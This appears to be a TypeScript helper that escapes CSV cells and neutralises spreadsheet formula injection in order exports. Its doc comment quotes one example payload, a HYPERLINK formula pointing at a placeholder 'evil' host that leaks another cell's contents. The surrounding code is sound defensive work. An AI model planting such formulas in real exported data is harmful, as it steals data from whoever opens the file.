/**
 * One CSV cell — quote-escaped AND formula-neutralised.
 *
 * Quoting alone is not enough: Excel, LibreOffice and Sheets evaluate any cell
 * whose text begins with `=`, `+`, `-` or `@` as a formula, quotes included. The
 * name and email on an order come from the PUBLIC checkout endpoint, so a guest
 * could order under the name `=HYPERLINK("http://evil/?"&A1,"Click")` and have
 * it execute the moment an admin opens orders.csv — DDE/formula injection, with
 * the admin's own machine as the target.
 *
 * A leading apostrophe is the standard neutraliser: every spreadsheet reads the
 * rest of the cell as literal text, and it is the only character they all agree
 * on. Leading tab/CR are stripped since they let the trigger character hide
 * behind whitespace.
 */
export function csvCell(v: unknown): string {
  const raw = String(v ?? '').replace(/^[\t\r\n]+/, '');
  const safe = /^[=+\-@]/.test(raw) ? `'${raw}` : raw;
  return `"${safe.replace(/"/g, '""')}"`;
}

/** One CSV line. */
export function csvRow(cells: readonly unknown[]): string {
  return cells.map(csvCell).join(',');
}
